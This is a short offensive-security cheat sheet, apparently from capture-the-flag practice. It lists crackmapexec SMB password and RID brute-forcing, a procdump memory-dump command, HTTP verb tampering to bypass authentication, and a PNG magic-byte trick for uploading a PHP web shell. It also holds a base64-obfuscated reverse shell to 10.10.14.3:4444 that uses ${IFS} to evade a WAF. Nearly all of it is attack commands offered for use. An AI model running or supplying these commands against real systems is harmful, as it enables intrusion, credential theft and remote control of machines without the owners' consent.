# Miscellaneous

##### Cisco Type 7 Password Hash Crack
```
http://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html
```

##### Bruteforce SMB
```
cme smb IP -u users.txt -p passwords.txt
```

##### Bruteforce RID
```
cme smb IP -u USER -p PASSWORD --rid-brute
```

##### Dump memory process
```
prodcump.exe -ma PID file.dmp
```

##### Verb Tampering
```
Change HTTP Method to bypass Authentication or check works or not.
```

##### Bypass WAF replacing spaces with ${IFS}
```
echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQo=|base64${IFS}-d|bash
```

##### Uncompile compiled Python File
```
mv backup backup.pyc
uncompyle6 backup.pyc
```

##### Mime magic bytes
`````
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png (Check Networked)
`````


##### Check CMS
```
wappalyzer http://10.10.10.138/writeup/ | jq
```

##### Scanning magento
```
php magescan.phar scan:all http://IP
```

